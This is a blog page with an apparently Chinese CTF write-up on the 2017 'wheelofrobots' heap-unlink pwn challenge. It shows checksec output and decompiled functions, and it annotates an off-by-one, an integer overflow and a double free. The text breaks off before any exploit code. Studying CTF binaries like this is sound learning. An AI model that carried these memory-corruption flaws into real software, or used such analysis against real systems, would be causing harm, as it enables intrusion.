@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn-unlink,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言  这两天一直在看堆的unlink利用方式，前面已经做了两道题，每道题都有新的收获，但是自己觉得还是印象不是很深刻，继续练习。  程序基本信息123456789root@a7f3b80cb67c:/home/docker/pwnable/2017_wheelofrobots# file ./wheelofrobots.dms./wheelofrobots.dms: ELF 64-bit LSB">
+<meta name="keywords" content="pwn-unlink">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017 wheelofrobots -unlink writeup">
+<meta property="og:url" content="https://v1ckydxp.github.io/archives/2019/06/27/2017_wheelofrobots/index.html">
+<meta property="og:site_name" content="v1cky&#39;blog">
+<meta property="og:description" content="前言  这两天一直在看堆的unlink利用方式，前面已经做了两道题，每道题都有新的收获，但是自己觉得还是印象不是很深刻，继续练习。  程序基本信息123456789root@a7f3b80cb67c:/home/docker/pwnable/2017_wheelofrobots# file ./wheelofrobots.dms./wheelofrobots.dms: ELF 64-bit LSB">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-11T00:57:41.576Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2017 wheelofrobots -unlink writeup">
+<meta name="twitter:description" content="前言  这两天一直在看堆的unlink利用方式，前面已经做了两道题，每道题都有新的收获，但是自己觉得还是印象不是很深刻，继续练习。  程序基本信息123456789root@a7f3b80cb67c:/home/docker/pwnable/2017_wheelofrobots# file ./wheelofrobots.dms./wheelofrobots.dms: ELF 64-bit LSB">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://v1ckydxp.github.io/archives/2019/06/27/2017_wheelofrobots/">
+
+
+
+
+
+  <title>2017 wheelofrobots -unlink writeup | v1cky'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1cky'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">few words,many deeds!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://v1ckydxp.github.io/archives/2019/06/27/2017_wheelofrobots/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="v1cky01dxp">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1cky'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2017 wheelofrobots -unlink writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-27T00:00:00+08:00">
+                2019-06-27
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-11T08:57:41+08:00">
+                2019-07-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>前言</strong></p>
+<blockquote>
+<p>这两天一直在看堆的<code>unlink</code>利用方式，前面已经做了两道题，每道题都有新的收获，但是自己觉得还是印象不是很深刻，继续练习。</p>
+</blockquote>
+<h3 id="程序基本信息"><a href="#程序基本信息" class="headerlink" title="程序基本信息"></a>程序基本信息</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@a7f3b80cb67c:/home/docker/pwnable/2017_wheelofrobots<span class="comment"># file ./wheelofrobots.dms</span></span><br><span class="line">./wheelofrobots.dms: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped</span><br><span class="line">root@a7f3b80cb67c:/home/docker/pwnable/2017_wheelofrobots<span class="comment"># checksec wheelofrobots.dms</span></span><br><span class="line">[*] <span class="string">'/home/docker/pwnable/2017_wheelofrobots/wheelofrobots.dms'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>程序是<code>64</code>位动态链接，开启了<code>canary</code>和<code>nx</code>保护。</p>
+</blockquote>
+<h3 id="程序代码逻辑分析"><a href="#程序代码逻辑分析" class="headerlink" title="程序代码逻辑分析"></a>程序代码逻辑分析</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">00000000006030E0</span> ; <span class="keyword">char</span> *chain_smoker</span><br><span class="line">.bss:<span class="number">00000000006030E8</span> ; <span class="keyword">char</span> *destructor</span><br><span class="line">.bss:<span class="number">00000000006030F</span>0 ; <span class="keyword">char</span> *bender</span><br><span class="line">.bss:<span class="number">00000000006030F</span>8 ; <span class="keyword">char</span> *tinny_tim</span><br><span class="line">.bss:<span class="number">0000000000603100</span> ; <span class="keyword">char</span> *robot_devil</span><br><span class="line">.bss:<span class="number">0000000000603108</span> ; <span class="keyword">char</span> *billionaire_bot</span><br><span class="line">.bss:<span class="number">0000000000603110</span> menu_num_buf    <span class="keyword">char</span>[<span class="number">4</span>]            </span><br><span class="line">.bss:<span class="number">0000000000603114</span> bender_flg      <span class="keyword">int</span></span><br><span class="line">.bss:<span class="number">0000000000603118</span> chain_smoker_flg <span class="keyword">int</span> </span><br><span class="line">.bss:<span class="number">000000000060311</span>C destructor_flg  <span class="keyword">int</span></span><br><span class="line">.bss:<span class="number">0000000000603120</span> tinny_tim_flg  <span class="keyword">int</span></span><br><span class="line">.bss:<span class="number">0000000000603124</span> robot_devil_flg <span class="keyword">int</span></span><br><span class="line">.bss:<span class="number">0000000000603128</span> billionaire_bot_flg <span class="keyword">int</span></span><br><span class="line">.bss:<span class="number">0000000000603130</span> use_count      <span class="keyword">int</span></span><br><span class="line">.bss:<span class="number">0000000000603138</span> intelligence    <span class="keyword">int</span></span><br><span class="line">.bss:<span class="number">0000000000603140</span> cruelty         <span class="keyword">int</span></span><br><span class="line">.bss:<span class="number">0000000000603148</span> powerful        <span class="keyword">int</span></span><br></pre></td></tr></table></figure>
+<h4 id="add-wheel（）"><a href="#add-wheel（）" class="headerlink" title="add_wheel（）"></a>add_wheel（）</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add_wheel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  wheels_name((__int64)<span class="string">"Which robot do you want to add to the wheel?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your choice :"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;menu_num_buf, <span class="number">0</span>, <span class="number">4u</span>LL);</span><br><span class="line">  <span class="comment">//menu_num_buf数组只有4字节，但是read_num函数读取的时候读取的5个字节，刚好覆盖了bender_flg的最后一位，这里存在off_by_one漏洞</span></span><br><span class="line">  menu_choice = read_num(&amp;menu_num_buf, <span class="number">5u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)use_count &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( menu_choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !tinny_tim_flg )</span><br><span class="line">        &#123;</span><br><span class="line">          tinny_tim = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0x14</span>uLL);</span><br><span class="line">          tinny_tim_flg = <span class="number">1</span>;</span><br><span class="line">          v0 = tinny_tim;</span><br><span class="line">          *(_QWORD *)tinny_tim = 'iT ynniT';</span><br><span class="line">          v0[<span class="number">4</span>] = <span class="string">'m'</span>;</span><br><span class="line">          ++use_count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !bender_flg )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Increase Bender's intelligence: "</span>, <span class="number">5L</span>L);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">5u</span>LL);</span><br><span class="line">          inc_intelligence = read_num(&amp;buf, <span class="number">5u</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( inc_intelligence &gt; <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Sorry impossible to make bender as smart!"</span>);</span><br><span class="line">            inc_intelligence = <span class="number">2</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          bender = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">20</span> * inc_intelligence);</span><br><span class="line">          intelligence = inc_intelligence;</span><br><span class="line">          bender_flg = <span class="number">1</span>;</span><br><span class="line">          strcpy(bender,'Bender');</span><br><span class="line">          ++use_count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !robot_devil_flg )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Increase Robot Devil's cruelty: "</span>, <span class="number">5L</span>L);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">5u</span>LL);</span><br><span class="line">          inc_cruelty = read_num(&amp;buf, <span class="number">5u</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( inc_cruelty &gt; <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"You are crazy!!"</span>);</span><br><span class="line">            inc_cruelty = <span class="number">20</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          robot_devil = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">20</span> * inc_cruelty);</span><br><span class="line">          cruelty = inc_cruelty;</span><br><span class="line">          robot_devil_flg = <span class="number">1</span>;</span><br><span class="line">          strcpy(robot_devil,'Robot Devil');</span><br><span class="line">          ++use_count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !chain_smoker_flg )</span><br><span class="line">        &#123;</span><br><span class="line">          chain_smoker = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0xFA0</span>uLL);</span><br><span class="line">          strcpy(chain_smoker,'Chain Smoker');</span><br><span class="line">          chain_smoker_flg = <span class="number">1</span>;</span><br><span class="line">          ++use_count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !billionaire_bot_flg )</span><br><span class="line">        &#123;</span><br><span class="line">          billionaire_bot = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0x9C40</span>uLL);</span><br><span class="line">          strcpy(billionaire_bot,'Billionaire Bot');</span><br><span class="line">          billionaire_bot_flg = <span class="number">1</span>;</span><br><span class="line">          ++use_count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !destructor_flg )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Increase Destructor's powerful: "</span>, <span class="number">5L</span>L);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">5u</span>LL);</span><br><span class="line">          inc_powerful = read_num(&amp;buf, <span class="number">5u</span>LL);  <span class="comment">// inc_powerful是无符号整数，read_num返回的是有符号整数,这里没有对inc_powerful判断大小，存在整数溢出，若inc_powerful是负数，则会分配一块很大的内存</span></span><br><span class="line">          destructor = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">20</span> * inc_powerful);</span><br><span class="line">          powerful = inc_powerful;</span><br><span class="line">          destructor_flg = <span class="number">1</span>;</span><br><span class="line">          strcpy(destructor,'Destructor');</span><br><span class="line">          ++use_count;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>添加轮子存在两个问题：</p>
+<ol>
+<li><code>menu_num_buf</code>数组只有<code>4</code>字节，但是<code>read_num</code>函数读取的时候读取的<code>5</code>个字节，刚好覆盖了<code>bender_flg</code>的最后一位，这里存在<code>off_by_one</code>漏洞。</li>
+<li><code>inc_powerful</code>是无符号整数，<code>read_num</code>返回的是有符号整数,这里没有对<code>inc_powerful</code>判断大小，存在整数溢出，若<code>inc_powerful</code>是负数，则会分配一块很大的内存，存在溢出。</li>
+</ol>
+</blockquote>
+<h4 id="delete-robot"><a href="#delete-robot" class="headerlink" title="delete_robot()"></a>delete_robot()</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">delete_wheel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> choice; <span class="comment">// ST0C_4</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  wheels_name((__int64)<span class="string">"Which robot do you want to remove from the wheel?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your choice :"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;menu_num_buf, <span class="number">0</span>, <span class="number">4u</span>LL);</span><br><span class="line">  choice = read_num(&amp;menu_num_buf, <span class="number">4u</span>LL);</span><br><span class="line">  result = choice;</span><br><span class="line">  <span class="keyword">switch</span> ( choice )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)tinny_tim_flg;</span><br><span class="line">      <span class="keyword">if</span> ( tinny_tim_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(tinny_tim);</span><br><span class="line">        tinny_tim_flg = <span class="number">0</span>;</span><br><span class="line">        result = use_count-- - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)bender_flg;</span><br><span class="line">      <span class="keyword">if</span> ( bender_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(bender);</span><br><span class="line">        bender_flg = <span class="number">0</span>;</span><br><span class="line">        result = use_count-- - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)robot_devil_flg;</span><br><span class="line">      <span class="keyword">if</span> ( robot_devil_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(robot_devil);</span><br><span class="line">        robot_devil_flg = <span class="number">0</span>;</span><br><span class="line">        result = use_count-- - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chain_smoker_flg;</span><br><span class="line">      <span class="keyword">if</span> ( chain_smoker_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(chain_smoker);</span><br><span class="line">        chain_smoker_flg = <span class="number">0</span>;</span><br><span class="line">        result = use_count-- - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)billionaire_bot_flg;</span><br><span class="line">      <span class="keyword">if</span> ( billionaire_bot_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(billionaire_bot);</span><br><span class="line">        billionaire_bot_flg = <span class="number">0</span>;</span><br><span class="line">        result = use_count-- - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)destructor_flg;</span><br><span class="line">      <span class="keyword">if</span> ( destructor_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(destructor);</span><br><span class="line">        destructor_flg = <span class="number">0</span>;</span><br><span class="line">        result = use_count-- - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>删除的时候只是进行了<code>free</code>，没有将<code>free</code>之后的指针置为空，这里存在<code>double free</code></p>
+</blockquote>
+<h4 id="change-name-robot"><a href="#change-name-robot" class="headerlink" title="change_name_robot()"></a>change_name_robot()</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> change_name_robot()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> name_id; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  wheels_name((__int64)<span class="string">"Which robot's name do you want to change?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your 